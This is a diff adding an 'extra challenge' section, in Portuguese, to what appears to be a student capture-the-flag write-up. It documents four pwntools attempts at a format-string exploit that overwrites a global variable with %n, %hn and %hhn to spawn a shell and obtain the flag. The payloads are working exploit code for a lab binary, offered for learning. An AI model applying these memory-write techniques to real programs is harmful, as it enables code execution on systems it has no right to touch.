@@ -120,3 +120,79 @@ Ao executar o script, obtivemos a flag como o esperado:
 <img src="../screenshots/ctf7/flag2.PNG" alt="flag">
 
 
+
+## Desafio extra
+
+### Recolha de informação e Reconhecimento da vulnerabilidade
+
+Este desafio é muito semelhante ao desafio anterior, sendo que, desta vez, o endereço da variável `key` é `0x804b320`.
+
+<img src="../screenshots/ctf7/d3_key.PNG" alt="key">
+
+### Exploração da vulnerabilidade
+
+#### Tentativa 1
+
+Primeiramente, tentamos modificar o valor da variável global `key` usando o `%n`, tal como fizemos no desafio 2:
+
+```py
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x20\xB3\x04\x08%.48871x%n")
+p.interactive()
+```
+
+No entanto, não foi possível obter o output esperado, pelo que `\x20` corresponde a um espaço em código ASCII, o que não permite a leitura total da string injetada.
+
+#### Tentativa 2
+
+Assim sendo, tentamos escrever para o endereço `0x804b31F` (1 byte anterior ao endereço da `key`) o valor de `0xBEEF00`:
+
+<img src="../screenshots/ctf7/try2_1.PNG" alt="try">
+
+
+```py
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x1F\xB3\x04\x08%.12513024x%n")
+p.interactive()
+```
+
+Desta vez, a shell era de facto lançada, seguida imediatamente de um timeout, o que é justificado pelo elevado número de caracteres (mais de 12 milhões) escritos:
+
+<img src="../screenshots/ctf7/try2.PNG" alt="try">
+
+#### Tentativa 3
+
+De modo a minimizar o número de caracteres escritos, optamos por usar os format specifiers `%hn` e `%hhn`, que nos permitem dividir o valor `0xBEEF00` em: **(1)** `0xBE` (1 byte, `%hhn`) e **(2)** `0xEF00` (2 bytes, `%hn`):
+
+```py
+p.recvuntil(b"here...")
+p.sendline(b"AAAA\x21\xB3\x04\x08BBBB\x1F\xB3\x04\x08%.%172x%hhn%60994x%hn")
+p.interactive()
+```
+
+Ao executar o script, não foi possível lançar o terminal, na medida em que a string injetada ultrapassa os 32 bytes, espaço alocado ao `buffer`.
+
+#### Tentativa 4
+
+Por fim, usamos os format specifiers `%1$hhn` e `%2$hn` para poupar 8 bytes no nosso input - `%m$` permite-nos referenciar o m-ésimo argumento. 
+
+```py
+p.recvuntil(b"here...")
+p.sendline(b"\x21\xB3\x04\x08\x1F\xB3\x04\x08%.182x%1$hhn%.60994x%2$hn")
+p.interactive()
+```
+
+Como a string continua a ter mais de 32 bytes, passamos `%.182x` e `%.60994x` para `%182x` e `%60994x`, respetivamente:
+
+```py
+p.recvuntil(b"here...")
+p.sendline(b"\x21\xB3\x04\x08\x1F\xB3\x04\x08%182x%1$hhn%60994x%2$hn")
+p.interactive()
+```
+
+Ao executar o script, conseguimos obter a flag esperada:
+
+<img src="../screenshots/ctf7/flag3.PNG" alt="flag3">
+
+
+
